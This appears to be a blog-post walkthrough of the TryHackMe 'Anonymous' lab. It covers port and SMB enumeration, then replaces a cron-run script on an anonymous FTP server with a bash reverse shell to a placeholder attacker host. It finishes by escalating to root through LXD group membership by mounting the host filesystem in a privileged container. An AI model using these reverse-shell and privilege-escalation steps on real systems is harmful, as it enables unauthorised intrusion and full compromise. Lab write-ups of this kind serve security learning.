---
layout: post
title: Anonymous
date:   2025-10-01 11:05
description: TryHackMe chocolate factory CTF Write-Up
tags: tryhackme lxd 
comments: false
---

# ANONYMOUS
-TRYHACKME CTF WRITEUP-
[Link To CTF](https://tryhackme.com/room/anonymous))




Lets start with an nmap scan to enumerate the ports 

$ nmap -sCV <target_IP>

Running this gives us the answers to the first 3 questions

{% highlight html %}
{% raw %}
![img]({{ '/assets/images/anon/1-anon' | relative_url }}){: .center-image }
{% endraw %}
{% endhighlight html %}

{% highlight bash %}
How many ports are open?
What service is running on port 21?
What service is running on ports 139 and 445? 21?
{% endhighlight bash %}

Lets start smbmap to enumerate the open shares

{% highlight bash %}
$ smbmap -H <target_IP>
{% endhighlight bash %}


Running this we can see the answer to question 4


![img]({{ '/assets/images/anon/2-anon' | relative_url }}){: .center-image }
>
There's a share on the user's computer.  What's it called?
>


Now that thats out of the way lets get that User and Root Flag ...


I admittedly originally thought this was a steganography challenge
I spent awhile looking for hidden data in the dog pictures
And while they are adorable, there was nothing more to be found there

Moving to the ftp server,
We can see that we are allowed to login as anonymous

{% highlight bash %}
$ ftp anonymous@<target_IP>
{% endhighlight bash %}


We can see a directory named scripts...interesting...:

![img]({{ '/assets/images/anon/3-anon' | relative_url }}){: .center-image }


Lets download the files inside to our local machine

{% highlight bash %}
ftp> prompt 
ftp> mget clean.sh removed_files.log to_do.txt
{% endhighlight bash %}


Lets inspect 'clean.sh'
Looking at this shows us not only a bash script, but a scheduled task

![img]({{ '/assets/images/anon/4-anon' | relative_url }}){: .center-image }


Let's modify this and reupload it to the target machine 

$ nano clean.sh

We will use the (pentest monkey reverse shell)[https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet]


On our machine, 
Lets replace the contents of clean.sh with the following:

{% highlight bash %}
#!/bin/bash
/bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/port 0>&1'
{% endhighlight bash %}


![img]({{ '/assets/images/anon/5-anon' | relative_url }}){: .center-image }


Now lets start up our netcat listener 

{% highlight bash %}
$ nc -lvnp <port>
{% endhighlight bash %}


Now lets go back to the FTP server and upload the new file, replacing the old script

{% highlight bash %}
ftp> put clean.sh
{% endhighlight bash %}

![img]({{ '/assets/images/anon/6-anon' | relative_url }}){: .center-image }



Within a few moments we get a connection back to our listener


![img]({{ '/assets/images/anon/7-anon' | relative_url }}){: .center-image }


We can immediately see the user flag:


![img]({{ '/assets/images/anon/8-anon' | relative_url }}){: .center-image }


We now have access to the target machine and have captured the user flag

Let's now escalate privilege and get the root flag!
______________________________________



# Priv Esc


We cannot run sudo -l...
But running the "id" command 
We can see this user has access to the lxd group

![img]({{ '/assets/images/anon/9-anon' | relative_url }}){: .center-image }



{% highlight bash %}
Google search shows:
"This is a well-documented and easy-to-perform attack if an attacker's user account has been added to the lxd group. LXD's daemon runs as root, and any user with write access to its UNIX socket can execute privileged actions." " The core issue is that the lxd daemon runs with root privileges and will perform privileged actions for members of the lxd group, essentially making anyone in that group a root-equivalent user"
{% endhighlight bash %}

Exploit DB shows us how this can be exploited:
[Exploit-db](https://www.exploit-db.com/exploits/46978)


First download lxd apline builder on our machine:
{% highlight bash %}
$ wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
{% endhighlight bash %}



Then build the file:


{% highlight bash %}
$ sudo bash build-alpine
{% endhighlight bash %}

Check for the .tar.gz file:

![img]({{ '/assets/images/anon/10-anon' | relative_url }}){: .center-image }

Create a web server to transfer the file to the victim machine 

{% highlight bash %}
$ sudo python3 -m http.server 8080
{% endhighlight bash %}


Then on the victim machine, download the .tar.gz file


{% highlight bash %}
$ wget 10.*.*.*:8080/alpine-v3.13-x86_64-20210218_0139.tar.gz
{% endhighlight bash %}

Then started building the image file in the victim’s machine:
('anon' and 'my image' can be replaced with whatever)

{% highlight bash %}
lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
lxc image list
lxd init  (set a name and then use the default options)
lxc init myimage anon -c security.privileged=true
lxc config device add anon mydevice disk source=/ path=/mnt/root recursive=true
lxc start anon
{% endhighlight bash %}

![img]({{ '/assets/images/anon/11-anon' | relative_url }}){: .center-image }
![img]({{ '/assets/images/anon/12-anon' | relative_url }}){: .center-image }
![img]({{ '/assets/images/anon/13-anon' | relative_url }}){: .center-image }


We can now run 'lxc exec anon /bin/sh' to get root:

{% highlight bash %}
$ lxc exec anon /bin/sh
{% endhighlight bash %}



![img]({{ '/assets/images/anon/14-anon' | relative_url }}){: .center-image 


We then get the flag on the /mnt directory where we had mounted our root folder to from the earlier command

{% highlight bash %}
cd /mnt/root
cat root.txt
{% endhighlight bash %}


![img]({{ '/assets/images/anon/15-anon' | relative_url }}){: .center-image 


WE HAVE NOW PWND THE MACHINE AND ESCALATED PRIVILEGES TO CAPTURE THE ROOT FLAG
